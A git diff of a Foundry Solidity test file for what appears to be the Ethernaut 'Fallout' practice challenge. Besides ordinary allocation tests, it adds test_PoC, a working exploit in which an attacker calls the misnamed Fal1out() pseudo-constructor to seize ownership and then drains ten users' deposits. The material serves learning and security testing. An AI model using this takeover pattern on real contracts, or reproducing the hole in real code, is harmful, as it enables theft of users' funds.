@@ -66,25 +66,6 @@ contract FalloutTest is Test {
         assertEq(falloutInterface.allocations(ALICE), 10 ether);
     }
 
-    // function test_sendAllocation() public {
-    //     vm.prank(ALICE);
-    //     falloutInterface.allocate{value: 10 ether}();
-
-    //     assertEq(ALICE.balance, 0 ether);
-
-    //     vm.startPrank(BOB);
-
-    //     vm.expectRevert();
-    //     falloutInterface.sendAllocation(BOB);
-
-    //     vm.stopPrank();
-
-    //     vm.prank(ALICE);
-    //     falloutInterface.sendAllocation(ALICE);
-
-    //     // assertEq(ALICE.balance, 10 ether);
-    // }
-
     function test_sendAllocation() public {
         vm.deal(address(falloutInterface), 100 ether);
 
@@ -99,9 +80,139 @@ contract FalloutTest is Test {
 
         vm.expectRevert();
         falloutInterface.sendAllocation(BOB);
-        
+
         falloutInterface.sendAllocation(ALICE);
 
         assertEq(ALICE.balance, 10 ether);
+    }
+
+    function test_collectAllocations() public {
+        vm.prank(ALICE);
+        falloutInterface.allocate{value: 10 ether}();
+
+        vm.prank(BOB);
+        falloutInterface.allocate{value: 10 ether}();
+
+        vm.prank(CAROL);
+        falloutInterface.allocate{value: 10 ether}();
+
+        assertEq(address(falloutInterface).balance, 30 ether);
+
+        vm.startPrank(ATTACKER);
+
+        vm.expectRevert();
+        falloutInterface.collectAllocations();
+
+        vm.stopPrank();
+
+        vm.prank(OWNER);
+
+        falloutInterface.collectAllocations();
+
+        assertEq(address(falloutInterface).balance, 0 ether);
+        assertEq(OWNER.balance, 30 ether);
+    }
+
+    function test_PoC() public {
+        console.log(
+            "FALLOUT'S OWNER (BEFORE ATTACK): ",
+            falloutInterface.owner()
+        );
+        console.log(
+            "FALLOUT'S BALANCE (BEFORE DEPOSITS): ",
+            address(falloutInterface).balance
+        );
+
+        vm.prank(ALICE);
+        falloutInterface.allocate{value: 10 ether}();
+        console.log(
+            "FALLOUT'S BALANCE + ALICE'S DEPOSIT: ",
+            address(falloutInterface).balance
+        );
+
+        vm.prank(BOB);
+        falloutInterface.allocate{value: 10 ether}();
+        console.log(
+            "FALLOUT'S BALANCE + BOB'S DEPOSIT: ",
+            address(falloutInterface).balance
+        );
+
+        vm.prank(CAROL);
+        falloutInterface.allocate{value: 10 ether}();
+        console.log(
+            "FALLOUT'S BALANCE + CAROL'S DEPOSIT: ",
+            address(falloutInterface).balance
+        );
+
+        vm.prank(DAVE);
+        falloutInterface.allocate{value: 10 ether}();
+        console.log(
+            "FALLOUT'S BALANCE + DAVE'S DEPOSIT: ",
+            address(falloutInterface).balance
+        );
+
+        vm.prank(EVE);
+        falloutInterface.allocate{value: 10 ether}();
+        console.log(
+            "FALLOUT'S BALANCE + EVE'S DEPOSIT: ",
+            address(falloutInterface).balance
+        );
+
+        vm.prank(FRED);
+        falloutInterface.allocate{value: 10 ether}();
+        console.log(
+            "FALLOUT'S BALANCE + FRED'S DEPOSIT: ",
+            address(falloutInterface).balance
+        );
+
+        vm.prank(GARY);
+        falloutInterface.allocate{value: 10 ether}();
+        console.log(
+            "FALLOUT'S BALANCE + GARY'S DEPOSIT: ",
+            address(falloutInterface).balance
+        );
+
+        vm.prank(HARRY);
+        falloutInterface.allocate{value: 10 ether}();
+        console.log(
+            "FALLOUT'S BALANCE + HARRY'S DEPOSIT: ",
+            address(falloutInterface).balance
+        );
+
+        vm.prank(IAN);
+        falloutInterface.allocate{value: 10 ether}();
+        console.log(
+            "FALLOUT'S BALANCE + IAN'S DEPOSIT: ",
+            address(falloutInterface).balance
+        );
+
+        vm.prank(JANE);
+        falloutInterface.allocate{value: 10 ether}();
+        console.log(
+            "FALLOUT'S BALANCE + JANE'S DEPOSIT: ",
+            address(falloutInterface).balance
+        );
+
+        console.log(
+            "FALLOUT'S BALANCE (AFTER DEPOSITS): ",
+            address(falloutInterface).balance
+        );
+
+        vm.startPrank(ATTACKER);
+
+        falloutInterface.Fal1out();
+        falloutInterface.collectAllocations();
+
+        vm.stopPrank();
+
+        console.log(
+            "FALLOUT'S OWNER (AFTER ATTACK): ",
+            falloutInterface.owner()
+        );
+        console.log(
+            "FALLOUT'S BALANCE (AFTER ATTACK): ",
+            address(falloutInterface).balance
+        );
+        console.log("ATTACKER'S BALANCE (AFTER ATTACK): ", ATTACKER.balance);
     }
 }
